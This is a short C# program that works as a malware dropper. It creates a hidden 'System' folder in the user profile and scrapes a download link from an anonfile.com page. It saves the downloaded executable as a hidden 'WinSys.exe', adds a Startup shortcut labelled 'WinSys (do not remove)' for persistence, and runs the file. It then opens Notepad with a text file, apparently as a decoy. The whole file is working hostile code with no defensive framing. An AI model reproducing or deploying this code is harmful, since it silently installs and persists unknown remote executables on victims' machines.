using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.IO;
using System.Net;

namespace A2
{
    class Program
    {
        static void Main(string[] args)
        {
            string userprofileFolder = Environment.GetEnvironmentVariable("USERPROFILE");
            System.Diagnostics.Debug.WriteLine(userprofileFolder);
            string userStartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            System.Diagnostics.Debug.WriteLine(userStartupFolder);
            string path = userprofileFolder + @"\System";
            if (!Directory.Exists(path))
            {
                DirectoryInfo di = Directory.CreateDirectory(path);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            String filePath = userprofileFolder + @"\System\WinSys.exe";
            if (!System.IO.File.Exists(filePath))
            {
                using (WebClient client = new WebClient())
                {
                    string s = client.DownloadString("https://anonfile.com/j1Eerfi5bf/A3_exe");
                    System.Diagnostics.Debug.WriteLine(s);
                    String St = s;

                    int pFrom = St.IndexOf("<a type=\"button\" id=\"download-url\" class=\"btn btn-primary btn-block\" href=\"") + "<a type=\"button\" id=\"download-url\" class=\"btn btn-primary btn-block\" href=\"".Length;
                    int pTo = St.IndexOf("\"><i");

                    String result = St.Substring(pFrom, pTo - pFrom);
                    System.Diagnostics.Debug.WriteLine(result);
                    using (var clientt = new WebClient())
                    {
                        clientt.DownloadFile(result, filePath);
                        System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);

                        string shortcutLocation = System.IO.Path.Combine(userStartupFolder, "WinSys" + ".lnk");
                        WshShell shell = new WshShell();
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

                        shortcut.Description = "WinSys (do not remove)";
                        shortcut.TargetPath = filePath;
                        shortcut.Save();
                    }
                }

            }
            System.Diagnostics.Process.Start(filePath);
            System.Diagnostics.Process.Start("notepad.exe", "mybeautifultexe.txt");
        }
    }
}